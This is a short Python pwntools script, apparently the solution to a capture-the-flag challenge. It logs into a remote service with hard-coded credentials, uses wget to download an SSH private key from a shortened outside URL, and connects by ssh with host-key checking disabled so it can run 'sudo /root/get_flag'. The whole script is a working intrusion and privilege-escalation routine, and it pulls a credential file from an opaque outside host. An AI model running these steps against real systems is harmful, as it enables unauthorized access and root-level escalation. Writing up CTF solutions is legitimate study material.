from pwn import *

url = 'https://cutt.ly/ovklGuR'

r = remote('0.0.0.0', '22222', level='error')
r.sendlineafter('username:', 'test_soal1')
r.sendlineafter('password:','12345')

r.sendlineafter('$', f'wget -Oid_rsa {url}')
r.sendlineafter('$', f'chmod 400 id_rsa')
r.sendlineafter('$', f' ssh -o "StrictHostKeyChecking no" -p 2222 -i id_rsa joints@localhost sudo /root/get_flag')

r.interactive()